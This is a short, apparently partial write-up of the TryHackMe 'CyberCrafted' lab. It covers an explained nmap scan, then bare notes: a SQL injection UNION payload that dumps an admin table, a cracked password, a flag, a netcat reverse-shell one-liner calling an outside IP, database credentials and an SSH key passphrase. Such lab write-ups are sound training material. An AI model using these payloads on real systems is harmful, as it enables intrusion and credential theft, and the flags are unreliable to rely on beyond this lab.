# #1 Introduction
<img width="650" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/8f965ab0-677e-4db0-9741-002c2469d6e2">

# #2 Nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx cybercrafted.thm
```

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- cybercrafted.thm
```

we got these open ports
```bash
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

test' UNION SELECT 1,id,user,hash FROM admin;#

1 	xXUltimateCreeperXx 	88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
4 	web_flag 	THM{bbe315906038c3a62d9b195001f75008}

xXUltimateCreeperXx:diamond123456789



rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6666 >/tmp/f


$db_host = "localhost";
$db_user = "root";
$db_pwd = "";
$db_name = "webapp";


ssh key password: creepin2006
